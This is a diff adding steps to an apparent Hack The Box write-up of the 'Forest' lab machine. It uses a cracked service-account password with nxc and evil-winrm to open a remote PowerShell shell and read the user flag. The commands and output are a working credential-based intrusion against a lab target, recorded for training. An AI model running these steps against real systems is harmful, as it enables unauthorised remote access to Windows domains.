@@ -80,7 +80,26 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:b73c81fb8c33164c016884a6be75e669$2beb8c478e
 ...
 ```
 
-Discovered I could login to the service account via `winrm` on port `598`
+Discovered I could login to the service account via `winrm` on port `5985`.
+```bash
+nxc winrm 'FOREST' -u 'svc-alfresco' -p 's3rvice' -d 'htb.local'
+
+WINRM       10.10.10.161    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) 
+WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
+```
+
+Used `evil-winrm` to get a remote shell.
+```bash
+evil-winrm -i 'FOREST' -u 'htb.local\svc-alfresco' -p 's3rvice'
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
+```
+
+User flag was in `svc-alfresco`'s Desktop.
+```bash
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> more ../Desktop/user.txt
+```
+
 
 
 
